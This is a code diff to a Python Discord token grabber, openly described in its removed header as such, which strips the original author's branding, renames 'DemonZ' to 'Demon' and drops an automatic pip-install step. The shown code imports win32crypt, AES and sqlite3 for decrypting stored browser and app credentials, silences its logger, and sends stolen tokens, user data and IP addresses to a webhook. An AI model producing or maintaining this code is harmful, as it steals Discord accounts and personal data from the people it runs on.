@@ -1,8 +1,3 @@
-# Discord token grabber with robust browser and Discord app support
-# 7-29-25
-# Author: Itzzkirito
-# Brand: DemonZ
-
 import os
 import sys
 import re
@@ -11,29 +6,17 @@ import base64
 import urllib.request
 import datetime
 import subprocess
-import argparse
 import random
 from threading import Thread, Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 import time
-
-def install_import(modules):
-    for module, pip_name in modules:
-        try:
-            __import__(module)
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
-            os.execl(sys.executable, sys.executable, *sys.argv)
-
-install_import([("win32crypt", "pypiwin32"), ("Crypto", "pycryptodome")])
-
 import sqlite3
 from Crypto.Cipher import AES
 import win32crypt
 
 logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
-Logger = logging.getLogger("DemonZ")
+Logger = logging.getLogger("Demon")
 Logger.disabled = True
 
 # Constants
@@ -402,7 +385,7 @@ def send_token_info(token, user_data, platform, ip):
         if flags & 256: badges += ":BadgeBalance: "
 
         embed = {
-            "username": "DemonZ",
+            "username": "Demon",
             "avatar_url": CONFIG.get("avatar_url", "https://i.imgur.com/example.png"),
             "embeds": [
                 {
@@ -502,7 +485,7 @@ def main():
         Logger.error("Configuration validation failed! Please fix the errors above.")
         sys.exit(1)
     
-    Logger.info("Starting DemonZ  - Professional Edition")
+    Logger.info("Starting Demon  - Professional Edition")
     if CONFIG.get('dry_run'):
         Logger.info("[DRY RUN MODE] No data will be sent to webhooks")
     
@@ -562,7 +545,7 @@ def main():
     else:
         Logger.info("No valid tokens found")
     
-    Logger.info("DemonZ completed successfully")
+    Logger.info("Demon completed successfully")
 
 if __name__ == "__main__":
     try:
